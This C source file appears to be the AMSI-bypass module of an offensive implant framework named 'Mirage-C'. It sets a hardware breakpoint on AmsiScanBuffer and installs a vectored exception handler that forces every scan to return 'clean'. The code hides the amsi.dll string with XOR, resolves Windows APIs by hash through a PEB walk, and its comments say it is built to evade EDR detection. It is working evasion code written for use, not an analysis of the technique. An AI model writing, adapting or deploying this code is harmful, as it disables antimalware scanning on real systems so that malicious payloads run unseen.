/*
 * amsi_bypass.c — AMSI bypass for Mirage-C
 *
 * Hardware breakpoint technique: sets DR0 on AmsiScanBuffer,
 * installs a VEH that intercepts execution and returns
 * AMSI_RESULT_CLEAN (0) without patching .text section.
 *
 * This avoids NtProtectVirtualMemory + NtWriteVirtualMemory
 * patterns that modern EDRs detect.
 */

#include "amsi_bypass.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_AMSI_BYPASS
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "nt_types.h"
#include "mirage_asm.h"
#include <string.h>

/* ── CONTEXT offsets for x64 ──────────────────────────────── */

#define CTX_RAX   0x078
#define CTX_RBX   0x090
#define CTX_RCX   0x080
#define CTX_RDX   0x088
#define CTX_RSP   0x098
#define CTX_RBP   0x0a0
#define CTX_R8    0x0b8
#define CTX_R9    0x0c0
#define CTX_RIP   0x0f8
#define CTX_DR0   0x048
#define CTX_DR7   0x070

#define EXCEPTION_SINGLE_STEP  0x80000004
#define EXCEPTION_CONTINUE_EXECUTION (-1)

/* DR7: enable DR0 local break on execute */
#define DR7_ENABLE_DR0_EXE  0x0000000000000001ULL
#define DR7_LEN1_DR0        0x0000000000000000ULL  /* 1-byte length */

/* ── XOR-encrypted strings ────────────────────────────────── */

static const uint8_t enc_amsi_dll[] = {
    0x69,0x65,0x2c,0x63,0x6d,0x61,0x2e,0x6c,0x6c,0x64
};
#define AMSI_DLL_LEN sizeof(enc_amsi_dll)

/* ── Function pointer types ───────────────────────────────── */

typedef void* (WINAPI *pRtlAddVectoredExceptionHandler)(ULONG, void *);
typedef ULONG (WINAPI *pRtlRemoveVectoredExceptionHandler)(void *);

/* ── State ────────────────────────────────────────────────── */

static void *g_amsi_scan_buffer = NULL;
static void *g_veh_handle = NULL;
static pRtlRemoveVectoredExceptionHandler g_fnRemoveVEH = NULL;

/* ── VEH handler ──────────────────────────────────────────── */

/*
 * On EXCEPTION_SINGLE_STEP at AmsiScanBuffer:
 *   - Rip = return address (skip function body)
 *   - Rsp += 8 (pop return address)
 *   - Rax = 0 (AMSI_RESULT_CLEAN)
 *   - Rdx = 0, R8 = 0 (zero buffer ptr and length)
 */
static LONG CALLBACK amsi_veh_handler(EXCEPTION_POINTERS *ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return 0; /* not ours — continue searching */

    DWORD64 *ctx = (DWORD64 *)ep->ContextRecord;
    DWORD64 rip = ctx[CTX_RIP / 8];

    /* Check if breakpoint hit AmsiScanBuffer */
    if ((void *)rip != g_amsi_scan_buffer)
        return 0;

    /* Read return address from stack */
    DWORD64 rsp = ctx[CTX_RSP / 8];
    DWORD64 ret_addr = *(DWORD64 *)rsp;

    /* Skip function: set Rip to return address, pop stack */
    ctx[CTX_RIP / 8] = ret_addr;
    ctx[CTX_RSP / 8] = rsp + 8;

    /* Return AMSI_RESULT_CLEAN */
    ctx[CTX_RAX / 8] = 0;

    /* Zero buffer and length to prevent any scan */
    ctx[CTX_RDX / 8] = 0;
    ctx[CTX_R8 / 8] = 0;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* ── Helper: resolve function from module by hash ─────────── */

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Cleanup ──────────────────────────────────────────────── */

static void amsi_cleanup(void) {
    /* Remove VEH */
    if (g_veh_handle && g_fnRemoveVEH) {
        g_fnRemoveVEH(g_veh_handle);
        g_veh_handle = NULL;
    }

    /* Clear DR0 and DR7 via NtSetContextThread */
    if (g_amsi_scan_buffer) {
        CONTEXT ctx;
        memset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        NTSTATUS st = NtGetContextThread_stub((uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
        if (st >= 0) {
            *(DWORD64 *)((char *)&ctx + CTX_DR0) = 0;
            *(DWORD64 *)((char *)&ctx + CTX_DR7) = 0;
            NtSetContextThread_stub((uint64_t)(HANDLE)(intptr_t)(-2), (uint64_t)&ctx);
        }
        g_amsi_scan_buffer = NULL;
    }
}

/* ── mirage_patch_amsi ────────────────────────────────────── */

int mirage_patch_amsi(void) {
    /* Load amsi.dll via PEB walk */
    uint8_t tmp[AMSI_DLL_LEN];
    mirage_xor_decrypt(enc_amsi_dll, tmp, AMSI_DLL_LEN);
    uint32_t mod_hash = mirage_encrypted_hash_module((const char*)tmp);
    void* amsi = mirage_get_module_by_hash(mod_hash);
    if (!amsi) return 0;

    /* Resolve AmsiScanBuffer */
    void* scan_buffer = resolve_func(amsi, "AmsiScanBuffer");
    if (!scan_buffer) return 0;

    /* Resolve RtlAddVectoredExceptionHandler from ntdll */
    void* ntdll = mirage_get_module_by_hash(
        mirage_encrypted_hash_module("ntdll.dll"));
    if (!ntdll) return 0;

    pRtlAddVectoredExceptionHandler fnAddVEH =
        (pRtlAddVectoredExceptionHandler)resolve_func(ntdll,
            "RtlAddVectoredExceptionHandler");
    g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll,
            "RtlRemoveVectoredExceptionHandler");
    if (!fnAddVEH || !g_fnRemoveVEH) return 0;

    /* Install VEH (first handler = highest priority) */
    g_veh_handle = fnAddVEH(1, amsi_veh_handler);
    if (!g_veh_handle) return 0;

    /* Set DR0 = AmsiScanBuffer address */
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    NTSTATUS st = NtGetContextThread_stub(
        (uint64_t)(HANDLE)(intptr_t)(-2),  /* NtCurrentThread */
        (uint64_t)&ctx);
    if (st < 0) { amsi_cleanup(); return 0; }

    *(DWORD64 *)((char *)&ctx + CTX_DR0) = (DWORD64)scan_buffer;
    *(DWORD64 *)((char *)&ctx + CTX_DR7) = DR7_ENABLE_DR0_EXE;

    st = NtSetContextThread_stub(
        (uint64_t)(HANDLE)(intptr_t)(-2),
        (uint64_t)&ctx);
    if (st < 0) { amsi_cleanup(); return 0; }

    g_amsi_scan_buffer = scan_buffer;
    return 1;
}

#endif /* ENABLE_AMSI_BYPASS */
